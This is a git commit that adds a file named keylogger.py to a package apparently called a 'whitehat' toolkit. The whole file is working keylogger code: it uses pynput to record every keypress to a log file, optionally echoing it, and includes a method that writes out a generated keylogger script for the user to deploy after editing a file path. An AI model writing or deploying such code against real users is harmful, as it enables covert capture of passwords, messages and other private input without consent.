0ead2bf65d259d8ba2bc18fc322fb96cc32a5d1f
LyQuid :3 <83483788+LyQuid12@users.noreply.github.com>
2021-11-01 13:54:59 +0700

    Create keylogger.py

---
+++ whitehat/keylogger.py
@@ -0,0 +1,27 @@
+from pynput.keyboard import Key, Listener
+import logging
+from .utilities.keylogger_utils import *
+
+class keylogger:
+    def start(logfile_path, allow_print):
+
+        logging.basicConfig(filename=logfile_path, level=logging.DEBUG, format=" %(asctime)s - %(message)s")
+
+        def on_press(key):
+            logging.info(str(key))
+            if allow_print == True:
+                print(str(key))
+            else:
+                pass
+
+        with Listener(on_press=on_press) as listener:
+            listener.join()
+
+    def make_keylogger(file_path):
+        file = open(file_path, "w")
+        content(file)
+        file.close()
+        print()
+        print("Done !")
+        print("Note : Don't forget to change the file path at line 4")
+        print()
